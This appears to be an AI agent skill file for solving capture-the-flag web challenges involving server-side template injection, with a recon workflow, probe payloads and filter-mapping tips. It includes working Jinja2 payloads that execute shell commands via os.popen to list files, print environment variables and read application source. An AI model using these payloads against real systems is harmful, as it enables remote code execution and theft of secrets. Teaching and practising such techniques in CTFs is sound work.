---
name: ctf-ssti-auto-enrich
description: Fast recon and enrichment for scoped CTF web targets suspected of server-side template injection. Use when a page echoes user text through a renderer, hints at templates/braces/filters, evaluates {{7*7}}, strips {% %} blocks, resets on blocked words, or needs quick SSTI proof, form discovery, blacklist mapping, engine fingerprinting, source/env reads, flag extraction, and concise evidence-backed handoff.
---

# CTF SSTI Auto-Enrich

## Fast Path

Run this order unless the user already provided stronger evidence:

1. Fetch `/`, headers, obvious helpers: `/robots.txt`, `/sitemap.xml`, `/healthz`, `/debug`, `/admin`, source maps and linked JS.
2. Identify render inputs from forms, query params, JSON keys, template upload fields, saved profile text, or headers.
3. Probe one input with: literal marker, `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`.
4. Classify response:
   - Rendered math -> SSTI likely.
   - Template error -> engine clue.
   - Redirect/default reset/flash -> filter or validation.
   - Stripped `{% %}` but working `{{ }}` -> expression-only injection.
5. Map only the blocking rules needed to choose a payload. Do not brute force the whole language.
6. Pivot to the shortest flag path: env `FLAG`, source fallback, `/flag*`, `/app/*`, challenge metadata.
7. Stop after flag plus reproducible proof.

Use `scripts/ssti_probe.py` first for one-form pages:

```bash
python scripts/ssti_probe.py https://target/ --auto --extract "output"
python scripts/ssti_probe.py https://target/ --method POST --field chant --payload "{{7*7}}" --extract "Chant output"
python scripts/ssti_probe.py https://target/ --method POST --field chant --payload-file payloads.txt --summary
```

Read `references/payload-ladder.md` only when selecting engine-specific payloads, bypasses, or filter tests.

## Sharp Recon

Prefer evidence that changes exploit direction:

- Response headers: framework hints, redirects, cookies, wrapper/proxy headers.
- HTML: form method/action/name, default textarea value, hidden fields, flash/error regions.
- JS: API paths, parameter names, client-side blocked tokens, source maps.
- Errors: exact template parser text, 500 vs custom validation.
- Reflections: whether input is HTML-escaped, template-rendered, or replaced with default content.

Keep a small table mentally or in notes:

```text
payload | status | output signal | meaning
{{7*7}} | 200    | 49            | Jinja/Twig-like expression eval
{%...%} | 200    | stripped text | block tags scrubbed, expressions survive
{{config}} | 302 | flash/reset    | blacklist keyword
```

## Jinja/Flask Shortcut

Try helper objects before long subclass walks:

```jinja2
{{cycler}}
{{joiner}}
{{namespace}}
{{lipsum}}
{{url_for}}
```

If `cycler.__init__.__globals__` exposes `os`, prefer direct, readable commands:

```jinja2
{{cycler.__init__.__globals__.os.popen("id").read()}}
{{cycler.__init__.__globals__.os.popen("pwd; ls -la /app").read()}}
{{cycler.__init__.__globals__.os.popen("printenv FLAG").read()}}
{{cycler.__init__.__globals__.os.popen("sed -n '1,160p' /app/app.py").read()}}
```

If `config`, `request`, or `self` are filtered, avoid those strings entirely. If `import` or `builtins` are filtered, reuse already-exposed `os` instead of importing.

## When To Pivot

- If SSTI is not confirmed after generic probes, hand back to `ctf-web` for broader web recon.
- If the challenge is solved and the user asks for polish, handoff, or evidence packaging, use `ctf-auto-enrich`.
- If the primitive is unfamiliar or crosses categories, use `ctf-novel-auto-enrich`.

## Output

Report only high-signal evidence:

- Vulnerability and engine.
- Proof payload and observed output.
- Filter/bypass used.
- Flag-read payload or source path.
- Flag.

Avoid dumping unrelated filesystem contents or secrets.
